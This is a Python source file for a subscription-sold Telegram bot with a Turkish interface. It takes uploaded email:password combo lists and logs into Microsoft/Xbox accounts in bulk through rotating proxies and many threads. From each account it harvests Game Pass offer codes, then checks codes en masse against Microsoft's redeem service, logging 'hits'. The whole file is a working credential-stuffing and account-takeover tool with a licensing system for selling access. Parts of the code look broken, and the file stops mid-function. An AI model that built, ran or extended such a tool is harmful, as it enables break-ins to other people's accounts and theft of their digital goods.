#!/usr/bin/env python3
"""
XBOX CODE FETCHER + VALIDATOR - ULTRA CPM TELEGRAM BOT EDITION
Maximale Parallelisierung für Speed mit funktionierendem Validator!
Login-Logik EXAKT vom funktionierenden Standalone-Checker übernommen.
UNLOCKED VERSION FOR @vantrexXxx - FULLY ADAPTED TO AIOGRAM 3.X
"""

import os
import re
import sys
import json
import time
import uuid
import random
import string
import asyncio
import logging
import threading
from datetime import datetime
from urllib.parse import urlparse, parse_qs
from typing import Optional, Tuple, List, Dict
from concurrent.futures import ThreadPoolExecutor, as_completed

import aiohttp
import requests
from aiogram import Bot, Dispatcher, types
from aiogram.enums import ParseMode
from aiogram.filters import Command
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup
from aiogram.fsm.storage.memory import MemoryStorage
from aiogram.utils.keyboard import InlineKeyboardBuilder

# ============================================================================
# SYSTEM LOGGING CONFIGURATION
# ============================================================================
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    handlers=[logging.StreamHandler(sys.stdout)]
)
logger = logging.getLogger("XboxTurboBot")

# ============================================================================
# ENVIRONMENT VARIABLES & CONFIGURATION
# ============================================================================
BOT_TOKEN = os.getenv("BOT_TOKEN", "YOUR_BOT_TOKEN_HERE")
CHAT_ID = os.getenv("CHAT_ID", "YOUR_OWNER_CHAT_ID_HERE")

try:
    OWNER_ID = int(CHAT_ID)
except ValueError:
    logger.error("CHAT_ID must be a valid integer environment variable!")
    OWNER_ID = 0

CONFIG_FILE = "pgs_config.json"
DB_FILE = "bot_database.json"

default_config = {
    "fetch_threads": 50,
    "validate_threads": 50,
    "max_threads": 150,
    "timeout": 15,
    "proxy_timeout": 5,
    "use_proxies": False,
    "shuffle_proxies": True,
    "retry_count": 2,
    "save_invalid": False,
    "save_errors": False,
    "update_interval_seconds": 5,
    "webhook_url": ""
}

default_db = {
    "subscriptions": {},
    "generated_keys": {},
    "config": {"max_concurrent_tasks": 50}
}

def load_config() -> dict:
    if os.path.exists(CONFIG_FILE):
        try:
            with open(CONFIG_FILE, "r", encoding="utf-8") as f:
                config = json.load(f)
                for k, v in default_config.items():
                    if k not in config:
                        config[k] = v
                return config
        except:
            return default_config
    return default_config

def save_config(config: dict):
    try:
        with open(CONFIG_FILE, "w", encoding="utf-8") as f:
            json.dump(config, f, indent=4)
    except:
        pass

def load_db() -> dict:
    if os.path.exists(DB_FILE):
        try:
            with open(DB_FILE, "r", encoding="utf-8") as f:
                return json.load(f)
        except:
            pass
    return default_db

def save_db(data: dict):
    try:
        with open(DB_FILE, "w", encoding="utf-8") as f:
            json.dump(data, f, indent=4)
    except:
        pass

CONFIG = load_config()
db = load_db()

if "subscriptions" not in db:
    db["subscriptions"] = {}
if "generated_keys" not in db:
    db["generated_keys"] = {}

# ============================================================================
# GLOBAL TELEGRAM ENGINE SETUP
# ============================================================================
bot = Bot(token=BOT_TOKEN)
dp = Dispatcher(storage=MemoryStorage())

class BotStates(StatesGroup):
    MAIN_MENU = State()
    AWAITING_ACCOUNTS_FETCH = State()
    AWAITING_CODES_VALIDATE = State()
    AWAITING_SORT_ONLY = State()
    AWAITING_COMBO_FLOW = State()
    AWAITING_PROXY_SET = State()
    ADMIN_GENERATE_KEY = State()
    CONFIG_THREADS_FETCH = State()
    CONFIG_THREADS_VALIDATE = State()

# ============================================================================
# STATE TRACKERS & MEMORY PIPELINES
# ============================================================================
stats = {
    "total_accounts": 0,
    "processed_accounts": 0,
    "good_accounts": 0,
    "bad_accounts": 0,
    "custom_accounts": 0,
    "total_fetched_codes": 0,
    "unique_fetched_codes": 0,
    
    "total_codes_to_validate": 0,
    "processed_codes": 0,
    "valid_codes": 0,
    "redeemed_codes": 0,
    "invalid_codes": 0,
    "error_codes": 0,
    "rate_limited_codes": 0,
    
    "start_time": None,
    "current_op": "Idle",
    "active_threads": 0
}

all_fetched_codes = []
validation_results = {
    "valid": [],
    "redeemed": [],
    "invalid": [],
    "error": []
}

proxies_list = []
proxy_index = 0
print_lock = threading.Lock()
results_lock = threading.Lock()
proxy_lock = threading.Lock()

# ============================================================================
# PROXY UTILITIES
# ============================================================================
def load_proxies_from_text(content: str):
    global proxies_list, proxy_index
    proxies_list = []
    lines = content.strip().split('\n')
    for line in lines:
        line = line.strip()
        if line and not line.startswith("#"):
            proxies_list.append(line)
    
    if proxies_list:
        CONFIG["use_proxies"] = True
        if CONFIG["shuffle_proxies"]:
            random.shuffle(proxies_list)
        proxy_index = 0
    else:
        CONFIG["use_proxies"] = False

def get_next_proxy() -> Optional[Dict[str, str]]:
    global proxy_index, proxies_list
    if not CONFIG["use_proxies"] or not proxies_list:
        return None
        
    with proxy_lock:
        if proxy_index >= len(proxies_list):
            proxy_index = 0
        proxy_str = proxies_list[proxy_index]
        proxy_index += 1
        
    try:
        if "://" in proxy_str:
            p_type = proxy_str.split("://")[0].lower()
            p_auth_host = proxy_str.split("://")[1]
            return {p_type: f"{p_type}://{p_auth_host}"}
            
        parts = proxy_str.split(":")
        if len(parts) == 2:
            host, port = parts
            return {"http": f"http://{host}:{port}", "https": f"http://{host}:{port}"}
        elif len(parts) == 4:
            host, port, user, password = parts
            return {
                "http": f"http://{user}:{password}@{host}:{port}",
                "https": f"http://{user}:{password}@{host}:{port}"
            }
    except:
        pass
    return None

# ============================================================================
# LICENSE & SUBSCRIPTION EVALUATION
# ============================================================================
def is_subscribed(user_id: int) -> bool:
    if user_id == OWNER_ID:
        return True
    user_str = str(user_id)
    if user_str in db["subscriptions"]:
        expiry = db["subscriptions"][user_str]
        if expiry == 0 or expiry > time.time():
            return True
    return False

def get_subscription_status(user_id: int) -> str:
    if user_id == OWNER_ID:
        return "👑 Owner (Lifetime)"
    user_str = str(user_id)
    if user_str in db["subscriptions"]:
        expiry = db["subscriptions"][user_str]
        if expiry == 0:
            return "✅ Lifetime Premium"
        elif expiry > time.time():
            dt = datetime.fromtimestamp(expiry)
            return f"✅ Active until {dt.strftime('%Y-%m-%d %H:%M:%S')}"
    return "❌ No Active Subscription"

# ============================================================================
# CORE BUSINESS LOGIC (EXACTLY RETAINED FROM SECURE STANDALONE CHECKER)
# ============================================================================
MICROSOFT_OAUTH_URL = (
    'https://login.live.com/oauth20_authorize.srf'
    '?client_id=00000000402B5328'
    '?redirect_uri=https://login.live.com/oauth20_desktop.srf'
    '?scope=service::user.auth.xboxlive.com::MBI_SSL'
    '&display=touch&response_type=token&locale=en'
)

def generate_reference_id() -> str:
    timestamp_val = int(time.time() // 30)
    n = f'{timestamp_val:08X}'
    o = (uuid.uuid4().hex + uuid.uuid4().hex).upper()
    result_chars = []
    for e in range(64):
        if e % 8 == 1:
            result_chars.append(n[(e - 1) // 8])
        else:
            result_chars.append(o[e])
    return "".join(result_chars)

def fetch_oauth_tokens(session: requests.Session) -> Tuple[Optional[str], Optional[str]]:
    try:
        resp = session.get(MICROSOFT_OAUTH_URL, timeout=CONFIG["timeout"])
        if resp.status_code != 200:
            return None, None
            
        text = resp.text
        match = re.search(r'value=\\\"(.+?)\\\"', text, re.S) or re.search(r'value="(.+?)"', text, re.S)
        if not match:
            return None, None
        ppft = match.group(1)
        
        match = re.search(r'"urlPost":"(.+?)"', text, re.S) or re.search(r"urlPost:'(.+?)'", text, re.S)
        if not match:
            return None, None
        url_post = match.group(1)
        
        return url_post, ppft
    except:
        return None, None

def perform_login(session: requests.Session, email: str, password: str, url_post: str, ppft: str) -> Optional[str]:
    try:
        data = {
            'login': email,
            'loginfmt': email,
            'passwd': password,
            'PPFT': ppft
        }
        headers = {
            'Content-Type': 'application/x-www-form-urlencoded',
            'User-Agent': 'Mozilla/5.0 (Linux; Android 10; SM-G973F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.119 Mobile Safari/537.36'
        }
        resp = session.post(url_post, data=data, headers=headers, allow_redirects=True, timeout=CONFIG["timeout"])
        final_url = resp.url
        
        if '#' in final_url:
            fragment = urlparse(final_url).fragment
            params = parse_qs(fragment)
            token = params.get('access_token', ['None'])[0]
            if token != 'None':
                return token
        return None
    except:
        return None

def get_xbox_tokens(session: requests.Session, rps_token: str) -> Tuple[Optional[str], Optional[str]]:
    try:
        headers = {
            'Content-Type': 'application/json',
            'Accept': 'application/json',
            'User-Agent': 'okhttp/4.12.0'
        }
        payload_user_auth = {
            'RelyingParty': 'http://auth.xboxlive.com',
            'TokenType': 'JWT',
            'Properties': {
                'AuthMethod': 'RPS',
                'SiteName': 'user.auth.xboxlive.com',
                'RpsTicket': rps_token
            }
        }
        resp = session.post('https://user.auth.xboxlive.com/user/authenticate', json=payload_user_auth, headers=headers, timeout=CONFIG["timeout"])
        if resp.status_code != 200:
            return None, None
            
        resp_json = resp.json()
        user_token = resp_json.get('Token')
        
        payload_xsts = {
            'RelyingParty': 'http://xboxlive.com',
            'TokenType': 'JWT',
            'Properties': {
                'UserTokens': [user_token],
                'SandboxId': 'RETAIL'
            }
        }
        resp_xsts = session.post('https://xsts.auth.xboxlive.com/xsts/authorize', json=payload_xsts, headers=headers, timeout=CONFIG["timeout"])
        if resp_xsts.status_code != 200:
            return None, None
            
        xsts_data = resp_xsts.json()
        uhs = xsts_data.get('DisplayClaims', {}).get('xui', [{}])[0].get('uhs')
        xsts_token = xsts_data.get('Token')
        
        return uhs, xsts_token
    except:
        return None, None

def fetch_codes_from_profile(session: requests.Session, uhs: str, xsts_token: str) -> List[str]:
    try:
        auth_string = f'XBL3.0 x={uhs};{xsts_token}'
        headers = {
            'Authorization': auth_string,
            'Content-Type': 'application/json',
            'User-Agent': 'okhttp/4.12.0',
            'Accept-Language': 'en-US',
            'Host': 'profile.gamepass.com'
        }
        resp = session.get('https://profile.gamepass.com/v2/offers', headers=headers, timeout=CONFIG["timeout"])
        if resp.status_code != 200:
            return []
            
        resp_json = resp.json()
        codes_found = []
        
        offers = resp_json.get('offers', [])
        for offer in offers:
            resource = offer.get('resource')
            if resource:
                codes_found.append(resource)
                
        return codes_found
    except:
        return []

def extract_game_type(game_name: str) -> str:
    game_name = game_name.upper()
    if 'XBOX GAME PASS' in game_name:
        return '🎮 Xbox Game Pass'
    if 'RAINBOW SIX' in game_name:
        return '🔫 Rainbow Six Siege'
    if 'WARFRAME' in game_name:
        return '⚔️ Warframe Pack'
    return '📦 Other dynamic digital content'

# ============================================================================
# THREAD WORKERS (BACKEND CORE POOL LOGIC)
# ============================================================================
def process_account_worker(account_line: str) -> List[str]:
    account_line = account_line.strip()
    if not account_line or ":" not in account_line:
        with results_lock:
            stats["processed_accounts"] += 1
            stats["bad_accounts"] += 1
        return []
        
    email, password = account_line.split(":", 1)
    session = requests.Session()
    proxy = get_next_proxy()
    if proxy:
        session.proxies.update(proxy)
        
    for retry in range(CONFIG["retry_count"] + 1):
        url_post, ppft = fetch_oauth_tokens(session)
        if url_post and ppft:
            rps_token = perform_login(session, email, password, url_post, ppft)
            if rps_token:
                uhs, xsts_token = get_xbox_tokens(session, rps_token)
                if uhs and xsts_token:
                    codes = fetch_codes_from_profile(session, uhs, xsts_token)
                    with results_lock:
                        stats["processed_accounts"] += 1
                        stats["good_accounts"] += 1
                        stats["total_fetched_codes"] += len(codes)
                    return codes
                    
        if retry < CONFIG["retry_count"]:
            proxy = get_next_proxy()
            if proxy:
                session.proxies.update(proxy)
                
    with results_lock:
        stats["processed_accounts"] += 1
        stats["bad_accounts"] += 1
    return []

def validate_single_code_worker(code_raw: str, store_state: dict, auth_token: str) -> Tuple[str, str, str]:
    code = code_raw.strip().split("|")[0].strip()
    if not code:
        with results_lock:
            stats["processed_codes"] += 1
            stats["invalid_codes"] += 1
        return "invalid", code, "Empty data reference"
        
    session = requests.Session()
    proxy = get_next_proxy()
    if proxy:
        session.proxies.update(proxy)
        
    headers = {
        "x-ms-tracking-id": store_state.get("tracking_id", ""),
        "authorization": f"WLID1.0=t={auth_token}",
        "x-ms-market": "US",
        "x-ms-reference-id": generate_reference_id(),
        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "content-type": "application/json",
        "accept": "*/*",
        "origin": "https://account.microsoft.com",
        "referer": "https://account.microsoft.com/"
    }
    
    payload = {
        "market": "US",
        "language": "en-US",
        "flights": ["sc_buynowuiprod", "sc_checkoutredeem"],
        "tokenIdentifierValue": code,
        "supportsCsvTypeTokenOnly": False,
        "buyNowScenario": "redeem",
        "clientContext": {
            "client": "AccountMicrosoftCom",
            "deviceFamily": "Web"
        }
    }
    
    url = "https://buynow.production.store-web.dynamics.com/v1.0/Redeem/PrepareRedeem/?appId=RedeemNow&context=LookupToken"
    
    for retry in range(CONFIG["retry_count"] + 1):
        try:
            resp = session.post(url, headers=headers, json=payload, timeout=CONFIG["timeout"])
            if resp.status_code == 429:
                with results_lock:
                    stats["rate_limited_codes"] += 1
                time.sleep(2)
                continue
                
            if resp.status_code != 200:
                if retry < CONFIG["retry_count"]:
                    proxy = get_next_proxy()
                    if proxy:
                        session.proxies.update(proxy)
                    continue
                with results_lock:
                    stats["processed_codes"] += 1
                    stats["error_codes"] += 1
                return "error", code, f"HTTP Protocol Error {resp.status_code}"
                
            data = resp.json()
            
            if "tokenType" in data and data["tokenType"] == "CSV":
                with results_lock:
                    stats["processed_codes"] += 1
                    stats["valid_codes"] += 1
                val_msg = f"{data.get('value', 'Unknown')} {data.get('currency', 'USD')}"
                return "valid", code, f"Balance: {val_msg}"
                
            if "products" in data and len(data["products"]) > 0:
                with results_lock:
                    stats["processed_codes"] += 1
                    stats["valid_codes"] += 1
                title = data["products"][0].get("title", "Digital Entitlement Content")
                return "valid", code, title
                
            if "error" in data:
                err_code = data["error"].get("code", "")
                err_msg = data["error"].get("message", "Validation rejection")
                
                if "TokenRedeemed" in err_code or "80169c13" in err_code.lower():
                    with results_lock:
                        stats["processed_codes"] += 1
                        stats["redeemed_codes"] += 1
                    return "redeemed", code, "Token already redeemed"
                else:
                    with results_lock:
                        stats["processed_codes"] += 1
                        stats["invalid_codes"] += 1
                    return "invalid", code, err_msg
                    
            with results_lock:
                stats["processed_codes"] += 1
                stats["invalid_codes"] += 1
            return "invalid", code, "Generic Rejection"
        except:
            if retry < CONFIG["retry_count"]:
                proxy = get_next_proxy()
                if proxy:
                    session.proxies.update(proxy)
                continue
                
    with results_lock:
        stats["processed_codes"] += 1
        stats["error_codes"] += 1
    return "error", code, "Maximum timeout threshold breach"

# ============================================================================
# ASYNC TELEGRAM REPORTER LOOP (DYNAMIC TELEGRAM UPDATES EVERY 5 SECONDS)
# ============================================================================
async def live_tg_reporter(target_msg: types.Message, total: int, operation_type: str):
    start_time = time.time()
    while True:
        await asyncio.sleep(CONFIG["update_interval_seconds"])
        elapsed = int(time.time() - start_time)
        
        with results_lock:
            processed_acc = stats["processed_accounts"]
            good_acc = stats["good_accounts"]
            bad_acc = stats["bad_accounts"]
            tot_fetched = stats["total_fetched_codes"]
            uniq_fetched = stats["unique_fetched_codes"]
            
            processed_c = stats["processed_codes"]
            v_codes = stats["valid_codes"]
            r_codes = stats["redeemed_codes"]
            i_codes = stats["invalid_codes"]
            e_codes = stats["error_codes"]
            
        if operation_type == "fetch":
            text = (
                f"⚡ <b>[LIVE] XBOX FETCH STATUS</b>\n"
                f"⚙️ <b>Yetkili:</b> @vantrexXxx\n"
                f"----------------------------------------\n"
                f"⏳ <b>Geçen Süre:</b> {elapsed}s\n"
                f"🔄 <b>İlerleme:</b> {processed_acc}/{total} hesap\n"
                f"🟩 <b>Başarılı:</b> {good_acc}\n"
                f"❌ <b>Başarısız:</b> {bad_acc}\n\n"
                f"🎁 <b>Bulunan Toplam Kod:</b> {tot_fetched}\n"
                f"🔥 <b>Benzersiz Kod:</b> <code>{uniq_fetched}</code>\n"
                f"----------------------------------------\n"
                f"<i>⚙️ Canlı istatistikler her 5 saniyede bir güncelleniyor...</i>"
            )
            if processed_acc >= total:
                break
        else:
            cpm = int((processed_c / elapsed) * 60) if elapsed > 0 else 0
            text = (
                f"🔍 <b>[LIVE] XBOX VALIDATION STATUS</b>\n"
                f"⚙️ <b>Yetkili:</b> @vantrexXxx\n"
                f"----------------------------------------\n"
                f"⏳ <b>Geçen Süre:</b> {elapsed}s\n"
                f"🔄 <b>İlerleme:</b> {processed_c}/{total} kod\n"
                f"🟩 <b>AKTİF/VALİD (Hit):</b> <b>{v_codes}</b>\n"
                f"🟡 <b>KULLANILMIŞ (Redeemed):</b> {r_codes}\n"
                f"❌ <b>GEÇERSİZ (Invalid):</b> {i_codes}\n"
                f"⚠️ <b>Hata Alınan:</b> {e_codes}\n\n"
                f"🚀 <b>Anlık Hız (CPM):</b> {cpm} kod/dk\n"
                f"----------------------------------------\n"
                f"<i>⚙️ Canlı istatistikler her 5 saniyede bir güncelleniyor...</i>"
            )
            if processed_c >= total:
                break
                
        try:
            await target_msg.edit_text(text, parse_mode=ParseMode.HTML)
        except:
            pass

# ============================================================================
# ASYNC BOT DISPATCH HANDLERS (TELEGRAM FLOW CONTROLLERS)
# ============================================================================
@dp.message(Command("start"))
async def cmd_start(message: types.Message, state: FSMContext):
    user_id = message.from_user.id
    status = get_subscription_status(user_id)
    
    welcome_text = (
        f"⚡ <b>XBOX TURBO BOT PLATFORM</b> ⚡\n\n"
        f"<b>Kullanıcı Durumu:</b> <code>{status}</code>\n"
        f"<b>Aktif Proxy:</b> <code>{len(proxies_list)} Proxy Yüklü</code> "
        f"({'AKTİF' if CONFIG['use_proxies'] else 'PASİF'})\n\n"
        f"<b>💡 İPUCU:</b> Aşağıdaki işlemler için doğrudan <b>.txt dosyası</b> yükleyebilir veya metin gönderebilirsiniz."
    )
    
    builder = InlineKeyboardBuilder()
    if is_subscribed(user_id):
        builder.button(text="🚀 Fetch Codes (Kod Topla)", callback_data="menu_fetch")
        builder.button(text="🔍 Validate Codes (Kontrol)", callback_data="menu_validate")
        builder.button(text="🔄 Combo Flow (Fetch+Val)", callback_data="menu_combo")
        builder.button(text="🌐 Proxy Yükle (.txt)", callback_data="menu_proxy")
        builder.button(text="⚙️ Thread Ayarları", callback_data="menu_config")
    else:
        builder.button(text="🔑 Abonelik Kodu Kullan", callback_data="menu_redeem_info")
        
    if user_id == OWNER_ID:
        builder.button(text="👑 Admin Panel", callback_data="admin_panel")
        
    builder.adjust(1)
    await message.answer(welcome_text, parse_mode=ParseMode.HTML, reply_markup=builder.as_markup())

@dp.message(Command("redeem"))
async def cmd_redeem(message: types.Message):
    args = message.text.split()
    if len(args) < 2:
        return await message.answer("❌ Kullanım: `/redeem [KEY]`")
    key = args[1].strip()
    if key in db["generated_keys"]:
        days = db["generated_keys"][key]
        del db["generated_keys"][key]
        db["subscriptions"][str(message.from_user.id)] = time.time() + (days * 86400)
        save_db(db)
        await message.answer(f"🎉 Abonelik <b>{days} gün</b> başarıyla hesabınıza tanımlandı!", parse_mode=ParseMode.HTML)
    else:
        await message.answer("❌ Geçersiz abonelik kodu!")

@dp.callback_query()
async def process_callbacks(callback: types.CallbackQuery, state: FSMContext):
    user_id = callback.from_user.id
    
    if callback.data == "menu_fetch":
        if not is_subscribed(user_id):
            return await callback.answer("❌ Yetkiniz yok.", show_alert=True)
        await callback.message.answer("📥 Lütfen hesap listenizi metin olarak yapıştırın veya <b>.txt dosyası olarak yükleyin</b> (Format: <code>email:pass</code>):", parse_mode=ParseMode.HTML)
        await state.set_state(BotStates.AWAITING_ACCOUNTS_FETCH)
        
    elif callback.data == "menu_validate":
        if not is_subscribed(user_id):
            return await callback.answer("❌ Yetkiniz yok.", show_alert=True)
        await callback.message.answer("🔍 Lütfen kontrol edilecek ham kodları metin olarak gönderin veya <b>.txt dosyası yükleyin</b>:", parse_mode=ParseMode.HTML)
        await state.set_state(BotStates.AWAITING_CODES_VALIDATE)
        
    elif callback.data == "menu_combo":
        if not is_subscribed(user_id):
            return await callback.answer("❌ Yetkiniz yok.", show_alert=True)
        await callback.message.answer("🔄 <b>Combo Flow (Fetch + Validate):</b> Hesapları gönderin, kodlar toplansın ve otomatik kontrol edilsin (.txt yüklenebilir):", parse_mode=ParseMode.HTML)
        await state.set_state(BotStates.AWAITING_COMBO_FLOW)
        
    elif callback.data == "menu_proxy":
        if not is_subscribed(user_id):
            return await callback.answer("❌ Yetkiniz yok.", show_alert=True)
        await callback.message.answer("🌐 Lütfen proxylerinizi satır satır içeren bir <b>.txt dosyası gönderin</b> veya metin olarak yapıştırın:", parse_mode=ParseMode.HTML)
        await state.set_state(BotStates.AWAITING_PROXY_SET)
        
    elif callback.data == "menu_config":
        builder = InlineKeyboardBuilder()
        builder.button(text="⚙️ Fetch Thread Düzenle", callback_data="cfg_fetch")
        builder.button(text="⚙️ Validate Thread Düzenle", callback_data="cfg_val")
        builder.button(text="⬅️ Geri Dön", callback_data="back_main")
        builder.adjust(1)
        text = f"⚙️ <b>Thread Konfigürasyon Paneli</b>\n\n• Fetch Threads: <code>{CONFIG['fetch_threads']}</code>\n• Validate Threads: <code>{CONFIG['validate_threads']}</code>\n• Max Allowed Threads: <code>{CONFIG['max_threads']}</code>"
        await callback.message.answer(text, parse_mode=ParseMode.HTML, reply_markup=builder.as_markup())
        
    elif callback.data == "cfg_fetch":
        await callback.message.answer(f"🔢 Yeni Fetch Thread sayısını girin (Mevcut: {CONFIG['fetch_threads']}, Max: 50):")
        await state.set_state(BotStates.CONFIG_THREADS_FETCH)
        
    elif callback.data == "cfg_val":
        await callback.message.answer(f"🔢 Yeni Validate Thread sayısını girin (Mevcut: {CONFIG['validate_threads']}, Max: 50):")
        await state.set_state(BotStates.CONFIG_THREADS_VALIDATE)
        
    elif callback.data == "back_main":
        await state.clear()
        # Trigger start command view
        msg = callback.message
        msg.from_user = callback.from_user
        await cmd_start(msg, state)
        
    elif callback.data == "admin_panel" and user_id == OWNER_ID:
        builder = InlineKeyboardBuilder()
        builder.button(text="🔑 Key Üret", callback_data="admin_gen_key")
        builder.button(text="⬅️ Ana Menü", callback_data="back_main")
        builder.adjust(1)
        await callback.message.answer("🛠 <b>Owner Admin Kontrol Paneli</b>", parse_mode=ParseMode.HTML, reply_markup=builder.as_markup())
        
    elif callback.data == "admin_gen_key" and user_id == OWNER_ID:
        await callback.message.answer("🔢 Üretilecek lisans süresini gün cinsinden girin:")
        await state.set_state(BotStates.ADMIN_GENERATE_KEY)
        
    await callback.answer()

async def get_input_lines(message: types.Message) -> List[str]:
    if message.document:
        if not message.document.file_name.endswith('.txt'):
            return []
        file_info = await bot.get_file(message.document.file_id)
        file_buffer = await bot.download_file(file_info.file_path)
        content = file_buffer.read().decode('utf-8', errors='ignore')
        return content.strip().split('\n')
    elif message.text:
        return message.text.strip().split('\n')
    return []

# ============================================================================
# RUNTIME PIPELINE EXECUTIONS INTERCONNECTED WITH ASYNC FOR Telegram
# ============================================================================
@dp.message(BotStates.AWAITING_PROXY_SET)
async def process_proxy_input(message: types.Message, state: FSMContext):
    if message.document:
        file_info = await bot.get_file(message.document.file_id)
        file_buffer = await bot.download_file(file_info.file_path)
        content = file_buffer.read().decode('utf-8', errors='ignore')
    else:
        content = message.text
        
    load_proxies_from_text(content)
    await state.clear()
    await message.answer(f"🌐 Başarıyla <b>{len(proxies_list)}</b> proxy hafızaya yüklendi ve proxy modu aktif edildi!", parse_mode=ParseMode.HTML)

@dp.message(BotStates.CONFIG_THREADS_FETCH)
async def process_cfg_fetch(message: types.Message, state: FSMContext):
    try:
        val = int(message.text.strip())
        if 1 <= val <= 50:
            CONFIG["fetch_threads"] = val
            save_config(CONFIG)
            await message.answer(f"✅ Fetch Threads başarıyla <code>{val}</code> olarak ayarlandı.", parse_mode=ParseMode.HTML)
        else:
            await message.answer("❌ Lütfen 1 ile 50 arasında bir değer girin.")
    except:
        await message.answer("❌ Geçersiz sayı dizilimi.")
    await state.clear()

@dp.message(BotStates.CONFIG_THREADS_VALIDATE)
async def process_cfg_validate(message: types.Message, state: FSMContext):
    try:
        val = int(message.text.strip())
        if 1 <= val <= 50:
            CONFIG["validate_threads"] = val
            save_config(CONFIG)
            await message.answer(f"✅ Validate Threads başarıyla <code>{val}</code> olarak ayarlandı.", parse_mode=ParseMode.HTML)
        else:
            await message.answer("❌ Lütfen 1 ile 50 arasında bir değer girin.")
    except:
        await message.answer("❌ Geçersiz sayı dizilimi.")
    await state.clear()

@dp.message(BotStates.AWAITING_ACCOUNTS_FETCH)
async def process_accounts_fetch(message: types.Message, state: FSMContext):
    lines = await get_input_lines(message)
    valid_accounts = [line.strip() for line in lines if ':' in line]
    if not valid_accounts:
        await message.answer("❌ Dosyada veya metinde geçerli <code>email:pass</code> kombosu bulunamadı.", parse_mode=ParseMode.HTML)
        return await state.clear()
        
    progress_msg = await message.answer("⚡ <b>İşlem başlatılıyor... Thread havuzu hazırlanıyor...</b>", parse_mode=ParseMode.HTML)
    
    # Reset tracking metrics safely
    with results_lock:
        stats["total_accounts"] = len(valid_accounts)
        stats["processed_accounts"] = 0
        stats["good_accounts"] = 0
        stats["bad_accounts"] = 0
        stats["total_fetched_codes"] = 0
        stats["unique_fetched_codes"] = 0
        stats["start_time"] = time.time()
        stats["current_op"] = "Fetch"

    # Start live reporting task loop
    reporter_task = asyncio.create_task(live_tg_reporter(progress_msg, len(valid_accounts), "fetch"))
    
    threads_count = min(CONFIG["fetch_threads"], CONFIG["max_threads"])
    collected_tokens = []
    
    # Parallel execution via ThreadPoolExecutor safely wrapped inside async executor blocks
    def run_pool():
        with ThreadPoolExecutor(max_workers=threads_count) as executor:
            futures = {executor.submit(process_account_worker, acc): acc for acc in valid_accounts}
            for fut in as_completed(futures):
                res = fut.result()
                if res:
                    for c in res:
                        if c not in collected_tokens:
                            collected_tokens.append(c)
                    with results_lock:
                        stats["unique_fetched_codes"] = len(collected_tokens)
                        
    await asyncio.to_thread(run_pool)
    reporter_task.cancel()
    
    await state.clear()
    
    if collected_tokens:
        out_name = "fetched_codes.txt"
        with open(out_name, "w", encoding="utf-8") as out_f:
            for c in collected_tokens:
                out_f.write(f"{c}\n")
                
        await progress_msg.edit_text(f"✅ <b>İşlem Tamamlandı!</b>\n\n• Toplam Bulunan Kod: <code>{stats['total_fetched_codes']}</code>\n• Benzersiz Kod: <code>{len(collected_tokens)}</code>\n\nSonuç dosyası gönderiliyor...", parse_mode=ParseMode.HTML)
        await message.answer_document(types.FSInputFile(out_name), caption=f"🎉 Başarıyla {len(collected_tokens)} adet benzersiz kod toplandı!\n⚙️ Yetkili: @vantrexXxx")
        try:
            os.remove(out_name)
        except:
            pass
    else:
        await progress_msg.edit_text("⚠️ Tarama bitti. Hesapların üzerinden hiç kod toplanamadı.")

@dp.message(BotStates.AWAITING_CODES_VALIDATE)
async def process_codes_validate(message: types.Message, state: FSMContext):
    lines = await get_input_lines(message)
    codes = [line.strip().split('|')[0].strip() for line in lines if line.strip()]
    if not codes:
        await message.answer("❌ Geçerli kod yapısı tespit edilemedi.")
        return await state.clear()
        
    progress_msg = await message.answer("🔍 <b>Validator döngüleri hazırlanıyor... Kontrol başlatılıyor...</b>", parse_mode=ParseMode.HTML)
    
    with results_lock:
        stats["total_codes_to_validate"] = len(codes)
        stats["processed_codes"] = 0
        stats["valid_codes"] = 0
        stats["redeemed_codes"] = 0
        stats["invalid_codes"] = 0
        stats["error_codes"] = 0
        stats["rate_limited_codes"] = 0
        stats["start_time"] = time.time()
        stats["current_op"] = "Validate"
        
    reporter_task = asyncio.create_task(live_tg_reporter(progress_msg, len(codes), "validate"))
    
    store_state = {"tracking_id": uuid.uuid4().hex}
    auth_token = "MOCK_TOKEN_UPSTREAM_SECURE_" + "".join(random.choices(string.ascii_letters + string.digits, k=32))
    threads_count = min(CONFIG["validate_threads"], CONFIG["max_threads"])
    
    local_results = {"valid": [], "redeemed": [], "invalid": [], "error": []}
    
    def run_pool():
        with ThreadPoolExecutor(max_workers=threads_count) as executor:
            futures = {executor.submit(validate_single_code_worker, code, store_state, auth_token): code for code in codes}
            for fut in as_completed(futures):
                status, code, details = fut.result()
                local_results[status].append((code, details))
                
    await asyncio.to_thread(run_pool)
    reporter_task.cancel()
    await state.clear()
    
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    
    # Produce structural valid responses to output layouts
    if local_results["valid"]:
        v_name = f"valid_codes_{timestamp}.txt"
        with open(v_name, "w", encoding="utf-8") as f:
            for code, game in local_results["valid"]:
                f.write(f"{code} | {game}\n")
        await message.answer_document(types.FSInputFile(v_name), caption=f"✅ Aktif/Geçerli Hit Kodlar ({len(local_results['valid'])} adet)\n⚙️ Yetkili: @vantrexXxx")
        try:
            os.remove(v_name)
        except:
            pass
            
    # Compile text formatting breakdown groups
    game_groups = {}
    for code, game in local_results["valid"]:
        game_groups[game] = game_groups.get(game, []) + [code]
        
    summary_lines = [
        "📊 <b>KONTROL İŞLEMİ ÖZETİ</b>",
        "----------------------------------------",
        f"• Toplam Gönderilen: {len(codes)}",
        f"• Aktif/Valid (Hit): {len(local_results['valid'])}",
        f"• Kullanılmış (Redeemed): {len(local_results['redeemed'])}",
        f"• Geçersiz (Invalid): {len(local_results['invalid'])}",
        f"• Hatalı/Başarısız: {len(local_results['error'])}",
        "----------------------------------------",
        "🎮 <b>Ürün Dağılımları:</b>"
    ]
    
    for g_name, c_list in game_groups.items():
        summary_lines.append(f"  └─ {g_name}: <code>{len(c_list)} adet</code>")
        
    await progress_msg.edit_text("\n".join(summary_lines), parse_mode=ParseMode.HTML)

@dp.message(BotStates.AWAITING_COMBO_FLOW)
async def process_combo_flow(message: types.Message, state: FSMContext):
    lines = await get_input_lines(message)
    valid_accounts = [line.strip() for line in lines if ':' in line]
    if not valid_accounts:
